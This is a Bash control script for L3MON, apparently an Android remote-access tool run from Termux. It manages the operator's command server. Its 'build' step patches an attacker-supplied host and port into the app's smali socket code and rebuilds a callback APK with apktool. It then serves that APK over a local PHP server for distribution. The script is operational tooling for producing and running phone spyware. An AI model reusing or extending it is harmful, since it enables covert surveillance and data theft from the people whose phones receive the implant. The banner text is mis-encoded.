#!/bin/bash
Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clean='\033[0m'



#############################################################
# Start
#############################################################
if [ "$1" == "start" ]
then
	cd $PREFIX/share/L3MON/server
	pm2 start index.js -s
	printf "${IGreen}    [âœ”] ğ™‡3ğ™ˆğ™Šğ™‰ ğ™ğ™©ğ™–ğ™§ğ™©ğ™šğ™™  \n" | pv -qL 30

#############################################################
# Stop
#############################################################
elif [ "$1" == "stop" ]
then
	cd $PREFIX/share/L3MON/server
	pm2 stop index.js -s
	printf "${IRed}    [âœ˜] ğ™‡3ğ™ˆğ™Šğ™‰ ğ™ğ™©ğ™¤ğ™¥ğ™šğ™™\n" | pv -qL 30


#############################################################
# Restart
#############################################################
elif [ "$1" == "restart" ] 
then
	cd $PREFIX/share/L3MON/server
	pm2 restart index.js -s
	printf "${IPurple}    [âœ”] ğ—ŸğŸ¯ğ— ğ—¢ğ—¡ ğ—¥ğ—²ğ˜€ğ˜ğ—®ğ—¿ğ˜ğ—²ğ—±\n" | pv -qL 30

#############################################################
# Build
#############################################################
elif [ "$1" == "build" ]
then
	smaliFile="smali/com/etechd/l3mon/IOSocket.smali"
	if [ -d $PREFIX/share/L3MON ]; then
		appPath="$PREFIX/share/L3MON/server/app/factory/decompiled"
	fi
	printf "${ICyan}"
	read -p "    [âœ¯] ğ—›ğ—¼ğ˜€ğ˜ â§ " host
	read -p "    [âœ¯] ğ—£ğ—¼ğ—¿ğ˜ â§ " port
	sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile
	apktool b "$appPath" -o $PREFIX/share/L3MON/L3MON.apk > /dev/null 2>&1 &
	printf "${IGreen}    [âœ”] ğ—”ğ—½ğ—¸ ğ—•ğ˜‚ğ—¶ğ—¹ğ—± ğ—¦ğ˜‚ğ—°ğ—°ğ—²ğ˜€ğ˜€ğ—³ğ˜‚ğ—¹\n" | pv -qL 30
	cd $PREFIX/share/L3MON
	pkill php
	php -S localhost:8080 > /dev/null 2>&1 &
	sleep 2
	termux-open-url http://localhost:8080
	printf "${IGreen}\n"
	read -p "                ğ™‹ğ™§ğ™šğ™¨ğ™¨ ğ™€ğ™£ğ™©ğ™šğ™§ ğ™ğ™¤ğ™§ ğ™ğ™©ğ™¤ğ™¥ " host
	pkill php




#############################################################
# Bind 
#############################################################

elif [ "$1" == "bind" ]
then
	printf "${ICyan} [â˜…] ğ‘¨ğ’…ğ’…ğ’†ğ’… ğ‘ºğ’ğ’ğ’ ğ‘»ğ’‰ğ’Šğ’” ğ‘¶ğ’‘ğ’•ğ’Šğ’ğ’ ${clear}\n" | pv -qL 30


#############################################################
# Clean
#############################################################
elif [ "$1" == "clean" ]
then

	rm -rf $PREFIX/share/L3MON/server/maindb.json 
	pm2 restart $PREFIX/share/L3MON/server/index.js -s
	printf " ${ICyan}   [âœ”] ğ‚ğ¥ğğšğ§  ğ’ğ®ğœğœğğ¬ğ¬ğŸğ®ğ¥ \n" | pv -qL 30

#############################################################
# Help
#############################################################
elif [ "$1" == "help" ]
then

echo -e "${IGreen}â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”		${clean}
${IGreen}â”‚${clean}${IGreen} ğ—Ÿ ğŸ¯ ğ—  ğ—¢ ğ—¡${clean}  ${IGreen}â”œâ”€â”€â”
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
         â”Œâ”€â”€â”€â”€â”€â”€â”˜
       â”Œâ”€â”´â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”	
       â”‚${clean}${IGreen}START${clean}${IGreen}â”œâ”€â”€â”¬â”€â”¤${clean}${IGreen}STOP${clean}${IGreen}â”‚${IGreen}
       â””â”€â”€â”€â”€â”€â”˜  â”‚ â””â”€â”€â”€â”€â”˜
              â”Œâ”€â”´â”€â”€â”€â”€â”€â”  		
              â”‚${clean}${IGreen}RESTART${clean}${IGreen}â”‚
              â””â”€â”¬â”€â”€â”€â”€â”€â”˜
                â”‚
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”´â”  â”Œâ”€â”€â”€â”€â”		
        â”‚${clean}${IGreen}PASSWORD${clean}${IGreen}â”œâ”€â”€â”¤${clean}${IGreen}HELP${clean}${IGreen}â”‚
        â””â”€â”€â”€â”€â”¬â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”˜
          â”Œâ”€â”€â”˜ 
        â”Œâ”€â”´â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”		
        â”‚${clean}${IGreen}BUILD${clean}${IGreen}â”œâ”€â”¬â”€â”€â”¤${clean}${IGreen}BIND${clean}${IGreen}â”‚
        â””â”€â”€â”€â”€â”€â”˜ â”‚  â””â”€â”€â”€â”€â”˜
            â”Œâ”€â”€â”€â”´â”€â”€â”
            â”‚${clean}${IGreen}UPDATE${clean}${IGreen}â”‚
            â””â”€â”€â”€â”€â”€â”€â”˜${clean}"| pv -qL 800


############################################################
# Password 
############################################################
elif [ "$1" == "password" ]
then
	pm2 restart $PREFIX/share/L3MON/server/index.js -s

	printf " ${ICyan}"
	read -p "   [âœ¯] ğ™‰ğ™šğ™¬ ğ™‹ğ™–ğ™¨ğ™¨ğ™¬ğ™¤ğ™§ğ™™ â§ " pas
	pass=$(echo -n $pas | md5sum | awk '{print $1}')
	sed -i "s#\"password\": \"\"#\"password\": \"$pass\"#g" $PREFIX/share/L3MON/server/maindb.json
	pm2 restart $PREFIX/share/L3MON/server/index.js -s
	printf " ${IGreen}   [âœ”] ğ™‹ğ™–ğ™¨ğ™¨ğ™¬ğ™¤ğ™§ğ™™ ğ™ğ™–ğ™«ğ™šğ™™ \n" | pv -qL 30


###############################################################
# Update
###############################################################
elif [ "$1" == "update" ]
then
	cd
	printf " ${IGreen}   [â˜¢] ğ™‹ğ™¡ğ™šğ™–ğ™¨ğ™š ğ™’ğ™–ğ™ğ™© ğ™‡3ğ™ˆğ™Šğ™‰ ğ™ğ™¨ ğ™ğ™¥ğ™™ğ™–ğ™©ğ™ğ™£ğ™œ... \n" | pv -qL 30
	rm -rf $PREFIX/bin/lemon
	rm -rf L3MON-Termux > /dev/null 2>&1 
	git clone https://github.com/rootuserdj/L3MON-Termux.git > /dev/null 2>&1
	cd L3MON-Termux
	mv L3MON/lemon  $PREFIX/bin
	chmod +x $PREFIX/bin/lemon
	rm -rf $HOME/L3MON-Termux
	printf " ${IGreen}   [âœ”] ğ™‡3ğ™ˆğ™Šğ™‰ ğ™ğ™¥ğ™™ğ™–ğ™©ğ™šğ™™ ğ™ğ™ğ™˜ğ™šğ™¨ğ™¨ğ™›ğ™ªğ™¡ \n" | pv -qL 30
	

###############################################################
# Else Part 
###############################################################
else
	printf "${IRed}    [-] ğ™€ğ™§ğ™§ğ™¤ğ™§ ğ™ğ™§ğ™® ğ™–ğ™œğ™–ğ™ğ™£ ğ™¬ğ™ğ™©ğ™ -ğ™\n" | pv -qL 30
fi

